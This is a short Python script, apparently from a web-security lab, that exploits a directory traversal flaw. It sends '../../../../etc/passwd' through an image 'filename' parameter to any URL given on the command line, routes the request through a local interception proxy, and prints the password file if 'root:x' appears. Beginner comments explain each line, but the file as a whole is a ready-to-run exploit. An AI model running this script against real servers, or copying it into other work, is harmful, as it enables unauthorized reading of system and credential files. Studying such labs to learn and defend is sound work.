#It tries to access a sensitive file on a Linux system (/etc/passwd) by tricking a website into giving it, using a technique called directory traversal.


import sys      #sys: Used to get input from the command line.
import requests  #requests: A library to send HTTP requests.
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #urllib3.disable_warnings(...): This line disables security warnings if the website doesn't use a secure (HTTPS) certificate.

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
#This sets up a proxy server (usually used to monitor or capture traffic, like using tools such as Burp Suite).

def directory_traversal_exploit(url):
    image_url = url +'/image?filename=../../../../etc/passwd'
    #This creates a URL that tries to access the file: /etc/passwd using ../ to move up directories.
    #Example: if you do ../ four times, you're trying to go from a web folder to the root / folder.
    r = requests.get(image_url, verify=False, proxies=proxies)
    #Sends the request to that URL (ignores HTTPS issues and goes through the proxy).
    if 'root:x' in r.text:
      #Checks if the response contains "root:x" — a common line in /etc/passwd, which means the file was actually read.
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
      #If found, it prints the file content.
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)
      #If not found, it says the exploit failed and exits the program.

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
      #Checks if the user provided a URL when running the script.

      #If not, it prints how to use it and exits.
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)
  #Takes the URL you give it and runs the exploit function.

if __name__ == "__main__":
    main()
